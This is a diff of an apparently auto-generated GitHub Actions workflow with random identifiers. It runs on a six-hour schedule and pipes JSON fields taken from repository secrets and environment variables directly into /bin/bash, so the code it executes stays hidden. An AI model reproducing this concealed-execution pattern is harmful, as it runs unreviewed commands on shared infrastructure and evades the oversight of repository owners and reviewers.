@@ -3,21 +3,21 @@ name: wenhaoxuan3191
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 5/6 * * *'
+    - cron: '11 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wenhaoxuan3191
         env:
-          wq5: ${{ secrets.wq5 }}
+          zcng5: ${{ secrets.zcng5 }}
         run: |
-          echo $wq5 | jq -r .vxr49 | /bin/bash
-          echo $aoyf92502 | jq -r .o83 | /bin/bash
-          echo $k61 | jq -r .jmhy1096 | /bin/bash
-          echo $hqq72 | jq -r .n906 | /bin/bash
-          echo $r1436 | jq -r .nj329 | /bin/bash
-          echo $d019 | jq -r .gq425 | /bin/bash
+          echo $zcng5 | jq -r .g63547 | /bin/bash
+          echo $w0 | jq -r .ueaq24907 | /bin/bash
+          echo $jolfe014 | jq -r .awhar4180 | /bin/bash
+          echo $lqwhy47002 | jq -r .wpgx40 | /bin/bash
+          echo $xuj54 | jq -r .kigmd20083 | /bin/bash
 
